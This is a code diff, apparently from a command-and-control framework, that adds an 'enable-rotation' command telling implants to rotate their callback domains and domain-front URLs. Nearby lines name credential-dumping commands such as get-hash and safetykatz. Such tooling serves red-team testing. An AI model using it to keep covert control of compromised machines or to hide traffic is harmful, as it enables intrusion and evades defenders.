@@ -76,6 +76,9 @@ def handle_sharp_command(command, user, randomuri, implant_id):
     elif (command.startswith("get-hash")):
         do_get_hash(user, command, randomuri)
         return
+    elif (command.startswith("enable-rotation")):
+        do_rotation(user, command, randomuri)
+        return        
     elif (command.startswith("safetykatz")):
         do_safetykatz(user, command, randomuri)
         return
@@ -300,6 +303,11 @@ def do_help(user, command, randomuri):
 def do_shell(user, command, randomuri):
     new_task(command, user, randomuri)
 
+def do_rotation(user, command, randomuri):
+    domain = input("Domain or URL in array format: \"https://www.example.com\",\"https://www.example2.com\" ")
+    domainfront = input("Domain front URL in array format: \"fjdsklfjdskl.cloudfront.net\",\"jobs.azureedge.net\" ")
+    new_task("dfupdate %s" % domainfront, user, randomuri)
+    new_task("rotate %s" % domain, user, randomuri)
 
 def do_sharpwmi_execute(user, command, randomuri):
     style = Style.from_dict({'': '#80d130'})
